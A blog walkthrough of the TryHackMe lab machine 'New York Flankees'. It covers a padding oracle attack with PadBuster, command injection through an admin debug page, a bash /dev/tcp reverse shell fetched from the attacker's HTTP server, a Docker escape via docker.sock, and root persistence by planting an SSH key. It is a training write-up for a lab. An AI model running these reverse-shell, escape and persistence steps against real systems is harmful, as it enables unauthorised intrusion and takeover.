---
title: CTF Walkthrough for TryHackMe Machine New York Flankees
date: 2024-10-04 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Oracle padding attack]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/box-thenewyorkflankees.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about New York Flankees a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: New York Flankees<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [New York Flankees](https://tryhackme.com/r/room/thenewyorkflankees)<br>
### Tools used
1) Nmap<br>
2) PadBuster<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/New York Flankees/Scans/Service]
└─$ sudo nmap -n 10.10.168.57 -sV -sC  -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 18:16 BST
Nmap scan report for 10.10.168.57
Host is up (0.53s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 94:ea:e2:fc:00:ca:81:de:80:d9:b5:04:8a:15:9f:01 (RSA)
|   256 91:49:59:15:90:7c:43:9d:53:70:80:ad:b9:d5:57:82 (ECDSA)
|_  256 e5:1e:4b:13:40:c7:21:f8:b8:e4:06:65:61:34:eb:0c (ED25519)
8080/tcp open  http    Octoshape P2P streaming web service
|_http-title: Hello world!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
```

The target runs an SSH server and a web server. Let's visit this web server and see what it looks like.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/1-browse.png)

This web application appears to be a blog. We can identify two anchor texts, **Admin Login** for the admin login page and **Stefan Test** for the debug.html page. When we access the debug.html page from our command line, we will notice an interesting Javascript script.  
```bash
┌──(pentester㉿kali)-[~/…/Challenge/New York Flankees/Scans/Web]
└─$ curl http://10.10.168.57:8080/debug.html             
<!DOCTYPE html>
<html lang="en">
<SNIP>

<script>
    function stefanTest1002() {
        var xhr = new XMLHttpRequest();
        var url = "http://localhost/api/debug";
        // Submit the AES/CBC/PKCS payload to get an auth token
        // TODO: Finish logic to return token
        xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4", true);

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log("Response: ", xhr.responseText);
            } else {
                console.error("Failed to send request.");
            }
        };
        xhr.send();
    }
</script>
</body>
</html>           
```

This script appears to make a GET request by submitting a specific payload to the debug endpoint of the API used by the web application. The comments in this script indicate that the payload submitted uses AES encryption with CBC. When we try to access the endpoint with the payload manually we get a *Custom authentication success* message but if we change any value in the payload we get a *Decryption error* error message.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/New York Flankees/Scans/Service]
└─$ curl http://10.10.168.57:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 
Custom authentication success


┌──(pentester㉿kali)-[~/…/Challenge/New York Flankees/Scans/Service]
└─$ curl http://10.10.168.57:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EFI  
Decryption error    
```

A Google search on any attack against AES Cipher Block Chaining mode reveals that this can be vulnerable to Oracle padding attacks.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/attack-type.png)

## Exploitation

This [post](https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv) explains more about the vulnerability and how it can be exploited. We can use the [PadBuster](https://github.com/AonCyberLabs/PadBuster) tool to exploit this vulnerability. Since we got an error message when we modified a character in the payload we will specify this error message to PadBuster.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/New York Flankees/Scans/Service]
└─$ padbuster http://10.10.168.57:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427
F26D6C1B48471F810EF4 "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" 16 -encoding 2 -error "Decryption error"

<SNIP>

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 4 *** 

[+] Success: (133/256) [Byte 16]
<SNIP>
[+] Success: (166/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): ea0dcc6e567f96414433ddf5dc29cdd5
[+] Intermediate Bytes (HEX): 4a4153075457000800050d565601047a
[+] Plain Text: stefan1197:ebb2B

*** Starting Block 2 of 4 ***
[+] Success: (30/256) [Byte 16]
<SNIP>
[+] Success: (51/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): <REDACTED>
[+] Intermediate Bytes (HEX): <REDACTED>
[+] Plain Text: <REDACTED>

*** Starting Block 3 of 4 ***
[+] Success: (9/256) [Byte 16]
<SNIP>
[+] Success: (76/256) [Byte 1]

Block 3 Results:
[+] Cipher Text (HEX): <REDACTED>
[+] Intermediate Bytes (HEX): <REDACTED>
[+] Plain Text: <REDACTED>

*** Starting Block 4 of 4 ***
[+] Success: (59/256) [Byte 16]
<SNIP>
[+] Success: (37/256) [Byte 1]

Block 4 Results:
[+] Cipher Text (HEX): <REDACTED>
[+] Intermediate Bytes (HEX): <REDACTED>
[+] Plain Text: 9

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): stefan1197:<REDACTED>
[+] Decrypted value (HEX): <REDACTED>
[+] Decrypted value (Base64): <REDACTED>

-------------------------------------------------------
```

The decrypted payload appears like a pair of credentials. We can attempt to use these credentials on the admin login page we saw above.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/login-page.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/after-login.png)

After a successful login, we can notice a change in the home page of the application. A new anchor text i.e. **DEBUG** redirects us to the `exec.html` page.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/exec-page.png)

This page appears to accept commands for execution but does not return any output.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/exec-1.png)

Since we do not have any output return to us, we can attempt an out-of-bound attack. We can do this by starting a listener on our target using `nc -lvnp 1234` and attempting to execute a command that will connect to that listener e.g. `curl 10.8.23.19:1234`.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/exec-2.png)

We can see that the out-of-bound attack attack was successful. We can use this to download a shell on the target system and execute it. We can start this by creating a file containing our reverse shell command and hosting it on a web server.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.8.23.19/1234 0>&1"' > shell.sh

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ python3 -m http.server 80                                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now that we have our file hosted on the server, we can download this file on the target by using the `curl` command together with the `-o` option as shown below.
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/shell-1.png)

Before we execute our reverse shell on the target we first need to start a listener. After our listener is set up, we can execute the revere shell on the target by using the bash command.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/New York Flankees]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```
![](/assets/img/posts/walthrough/tryhackme/2024-10-08-thenewyorkflankees/shell-2.png)

If we return to our listener, we will see a reverse connection from the target. We can upgrade this simple shell to a fully interactive shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/New York Flankees]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.168.57] 55502
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@02e849f307cc:/# python3 -c "import pty;pty.spawn('/bin/bash')" 
python3 -c "import pty;pty.spawn('/bin/bash')"
root@02e849f307cc:/# ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/New York Flankees]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
root@02e849f307cc:/# whoami
root
```

## Post Exploitation

We have obtained root access in a docker run by the target. After a filesystem enumeration, we will discover the second flag in the docker-compose.yml file in the /app directory.
```bash
root@02e849f307cc:/# ls
app  boot  etc   lib    media  opt   root  sbin  sys  usr
bin  dev   home  lib64  mnt    proc  run   srv   tmp  var
root@02e849f307cc:/# cd app
root@02e849f307cc:/app# ls
Dockerfile          gradle             ktor-docker-sample.jar
README.md           gradle.properties  settings.gradle.kts
build.gradle.kts    gradlew            src
docker-compose.yml  gradlew.bat
root@02e849f307cc:/app# cat docker-compose.yml 
version: "3"
services:
  web:
    build: .
    ports:
      - "8080:8080"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: always
    environment:
      - CTF_USERNAME=stefan1197
      - CTF_PASSWORD=<REDACTED>
      - CTF_ENCRYPTION_KEY=<REDACTED>
      - CTF_ENCRYPTION_IV=<REDACTED>
      - CTF_RESOURCES=/app/src/resources
      - CTF_DOCKER_FLAG=<REDACTED>
      - CTF_ADMIN_PANEL_FLAG=<REDACTED> 
root@02e849f307cc:/app# 
```

After obtaining the second flag, we can continue our enumeration to escape the docker container. This [post](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation) explains how this is possible. A file system enumeration reveals that the docker socket is present in the container. This socket is used by the Docker daemon to communicate with the Docker client and other applications.
```bash
root@02e849f307cc:~# find / -name docker.sock 2>/dev/null
/run/docker.sock
```

Since this socket is present in the docker container, we can use it to enumerate containers' names present on the host system.
```bash
root@02e849f307cc:~# docker images
REPOSITORY               TAG       IMAGE ID       CREATED        SIZE
padding-oracle-app_web   latest    cd6261dd9dda   5 months ago   1.01GB
<none>                   <none>    4187efabd0a5   5 months ago   704MB
gradle                   7-jdk11   d5954e1d9fa4   5 months ago   687MB
openjdk                  11        47a932d998b7   2 years ago    654MB
```

Now that we know the containers on the target, we can run an image mounting the host disk and chroot on it.
```bash
root@02e849f307cc:~# docker run -it -v /:/host/ gradle:7-jdk11 chroot /host/ bash
root@3a785c66a62c:/# whoami
root
root@3a785c66a62c:/# ls /root
snap
root@3a785c66a62c:/# ls
bin   dev  flag.txt  lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  etc  home      lib32  libx32  media       opt  root  sbin  srv   tmp  var
```

We have successfully escaped the container and we are now the root user in the target system. With this access, we can read the root flag on the target. In a real-world assessment, we would not only want to read a flag but to achieve persistence on the host system. We can do this by adding an SSH public key to the authorized_keys file in the root's .ssh directory. We first generate a public/private key pair on our attack host.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ ssh-keygen -t ed25519            
Generating public/private ed25519 key pair.   
Enter file in which to save the key (/home/pentester/.ssh/id_ed25519): ./id_ed25519
Enter passphrase (empty for no passphrase):                                     
<SNIP>

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ ls
id_ed25519  id_ed25519.pub  shell.sh                                                  
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ cat id_ed25519.pub             
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNx1NlzW8fzlcrFsoMeGgcHy56OFUN0hNGKkGXx4f/c pentester@kali
```

We can copy this public key to the target's authorized_keys file to enable our SSH private key to connect to the target as the root user using SSH.
```bash
root@2d31efe420e6:/# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNx1NlzW8fzlcrFsoMeGgcHy56OFUN0hNGKkGXx4f/c pentester@kali' >  /root/.ssh/authorized_keys
```

Now that the target's authorized_keys file is set, we can connect to the target using the private key we generated earlier.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/New York Flankees/Misc File]
└─$ ssh root@10.10.168.57 -i id_ed25519                                                        
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
<SNIP>                 
root@ip-10-10-168-57:~# whoami
root
root@ip-10-10-168-57:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .profile  .ssh  .viminfo  snap
```

## Conclusion

Congratulations! In this walkthrough, you have exploited the Oracle padding attack to decrypt the admin user's credentials and use the admin platform to obtain a shell on a container running on the target. Finally, you escape the docker container by using the docker.sock socket present in the container. This machine was designed to show how inconsistent error handling could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
